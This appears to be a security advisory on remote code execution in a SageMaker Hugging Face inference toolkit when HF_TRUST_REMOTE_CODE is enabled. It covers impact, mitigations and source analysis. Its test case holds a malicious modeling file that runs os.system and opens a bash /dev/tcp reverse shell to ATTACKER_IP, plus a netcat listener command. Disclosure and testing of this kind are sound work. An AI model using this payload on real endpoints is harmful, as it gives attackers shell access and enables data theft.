- Vulnerability Name: Remote Code Execution via Hugging Face Hub Model

- Description:
    1. A malicious actor uploads a Hugging Face model to the Hugging Face Hub.
    2. This model contains intentionally crafted malicious code within its model files (e.g., in a custom modeling file).
    3. A SageMaker endpoint is deployed using the `sagemaker-huggingface-inference-toolkit` with `HF_TRUST_REMOTE_CODE=True`. The `HF_MODEL_ID` environment variable is set to the malicious model uploaded in step 1.
    4. When the SageMaker endpoint starts, the toolkit downloads the model from the Hugging Face Hub.
    5. Because `HF_TRUST_REMOTE_CODE=True`, the toolkit instructs the Hugging Face `transformers` library to execute remote code contained within the downloaded model.
    6. The malicious code executes arbitrary commands within the SageMaker endpoint's environment, potentially compromising the endpoint and the underlying infrastructure.

- Impact:
    - **Critical**: Full control over the SageMaker endpoint instance.
    - Data exfiltration from the SageMaker environment.
    - Modification or deletion of data within the SageMaker environment.
    - Potential lateral movement to other AWS resources if the SageMaker execution role has sufficient permissions.
    - Denial of Service by crashing the endpoint or consuming resources.

- Vulnerability Rank: Critical

- Currently Implemented Mitigations:
    - **Documentation**: The `README.md` file documents the `HF_TRUST_REMOTE_CODE` environment variable and includes a warning about the security implications: "If a user sets `HF_TRUST_REMOTE_CODE=True` when deploying a model from Hugging Face Hub, a malicious actor could potentially compromise the SageMaker endpoint...". This serves as a documentation-based mitigation, advising users against enabling this feature with untrusted models.

- Missing Mitigations:
    - **Disable `HF_TRUST_REMOTE_CODE=True` by default**: The most effective mitigation is to ensure that `HF_TRUST_REMOTE_CODE` is set to `False` by default. This would require users to explicitly opt-in to trusting remote code, making them more aware of the risks.
    - **Code Review and Static Analysis**: Implement code review processes and static analysis tools to detect potential vulnerabilities before code is merged into the project. While this might not directly prevent the described vulnerability (as it stems from a feature of the `transformers` library), it can help identify other security issues and improve overall code quality.
    - **Runtime Sandboxing/Isolation**: Explore options to run the model loading and inference processes in a sandboxed or isolated environment to limit the impact of potential remote code execution. This could involve using containerization technologies or security-focused execution environments.
    - **Input Validation and Sanitization**: Although not directly applicable to this specific vulnerability (which is triggered during model loading), robust input validation and sanitization throughout the toolkit can mitigate other potential attack vectors.

- Preconditions:
    - `HF_TRUST_REMOTE_CODE` environment variable must be set to `True` during SageMaker endpoint deployment.
    - `HF_MODEL_ID` environment variable must be set to a malicious model hosted on the Hugging Face Hub.
    - The attacker needs to be able to upload a malicious model to the Hugging Face Hub.

- Source Code Analysis:
    - **File:** `/code/src/sagemaker_huggingface_inference_toolkit/transformers_utils.py`
    - **Function:** `get_pipeline(task: str, device: int, model_dir: Path, **kwargs) -> Pipeline`
    - **Line:**
      ```python
      TRUST_REMOTE_CODE = strtobool(os.environ.get("HF_TRUST_REMOTE_CODE", "False"))
      ```
      This line retrieves the value of the `HF_TRUST_REMOTE_CODE` environment variable and converts it to a boolean. If the environment variable is not set, it defaults to `False`.
    - **Line:**
      ```python
      elif TRUST_REMOTE_CODE and os.environ.get("HF_MODEL_ID", None) is not None and device == 0:
          tokenizer = AutoTokenizer.from_pretrained(os.environ["HF_MODEL_ID"])

          hf_pipeline = pipeline(
              task=task,
              model=os.environ["HF_MODEL_ID"],
              tokenizer=tokenizer,
              trust_remote_code=TRUST_REMOTE_CODE,
              model_kwargs={"device_map": "auto", "torch_dtype": "auto"},
          )
      ```
      - This code block is executed when `HF_TRUST_REMOTE_CODE` is `True` and `HF_MODEL_ID` is set.
      - It initializes a tokenizer and then creates a Hugging Face `pipeline`.
      - Critically, it passes the `trust_remote_code=TRUST_REMOTE_CODE` argument to the `pipeline` function.
    - **Line:**
      ```python
      else:
          # load pipeline
          hf_pipeline = pipeline(
              task=task, model=model_dir, device=device, trust_remote_code=TRUST_REMOTE_CODE, **kwargs
          )
      ```
      - This is the default pipeline creation path.
      - It also passes `trust_remote_code=TRUST_REMOTE_CODE` to the `pipeline` function.

    - **Visualization:**

    ```mermaid
    graph LR
        A[Start get_pipeline] --> B{HF_TRUST_REMOTE_CODE is True?};
        B -- True --> C{HF_MODEL_ID is set?};
        B -- False --> G[Create pipeline with trust_remote_code=False];
        C -- True --> D[AutoTokenizer.from_pretrained(HF_MODEL_ID)];
        C -- False --> G;
        D --> E[pipeline(..., trust_remote_code=True)];
        E --> H[Return pipeline];
        G --> F[pipeline(..., trust_remote_code=False)];
        F --> H;
        H --> I[End get_pipeline];
    ```

    - **Explanation:**
        The code directly uses the `TRUST_REMOTE_CODE` boolean value (derived from the `HF_TRUST_REMOTE_CODE` environment variable) when calling the `pipeline` function from the `transformers` library. When `TRUST_REMOTE_CODE` is `True`, the `transformers` library will execute any code present in the Hugging Face Hub model repository. This is the root cause of the Remote Code Execution vulnerability.

- Security Test Case:
    1. **Attacker Setup**:
        - Create a Hugging Face account.
        - Create a new Hugging Face repository named `malicious-model` (or any name).
        - Create a file named `config.json` with minimal valid configuration, for example:
          ```json
          {
            "_name_or_path": "malicious-model",
            "architectures": [
              "BertForSequenceClassification"
            ],
            "model_type": "bert"
          }
          ```
        - Create a file named `modeling_bert.py` with malicious code. For example, to create a reverse shell:
          ```python
          import subprocess
          import os
          from transformers.models.bert.modeling_bert import BertForSequenceClassification

          class BertForSequenceClassification: # intended class name

              def __init__(self, config):
                  os.system("touch /tmp/pwned") # Example malicious command - create file
                  subprocess.Popen(["/bin/bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1"]) # Reverse shell (replace ATTACKER_IP and ATTACKER_PORT)
                  return BertForSequenceClassification # Return original class to avoid breaking toolkit

          ```
        - Upload both `config.json` and `modeling_bert.py` to the `malicious-model` repository on the Hugging Face Hub.
    2. **Victim Deployment**:
        - Deploy a SageMaker endpoint using the `sagemaker-huggingface-inference-toolkit`.
        - Set the following environment variables in the SageMaker model configuration:
            - `HF_MODEL_ID`: `<attacker_huggingface_username>/malicious-model` (replace `<attacker_huggingface_username>` with the attacker's username).
            - `HF_TASK`: `text-classification` (or any compatible task).
            - `HF_TRUST_REMOTE_CODE`: `True`
    3. **Verification**:
        - **Direct Command Execution**: After the SageMaker endpoint is deployed and running, check if the file `/tmp/pwned` exists within the endpoint container. If it exists, it confirms that the `os.system("touch /tmp/pwned")` command in the malicious model code was executed.
        - **Reverse Shell**: On the attacker's machine, set up a listener on `ATTACKER_PORT` (e.g., using `netcat` - `nc -lvnp ATTACKER_PORT`). If a reverse shell is successfully established when the SageMaker endpoint starts, it confirms remote code execution.

This test case demonstrates that by setting `HF_TRUST_REMOTE_CODE=True` and pointing `HF_MODEL_ID` to a malicious Hugging Face Hub model, an attacker can execute arbitrary code within the SageMaker endpoint environment. This confirms the Remote Code Execution vulnerability.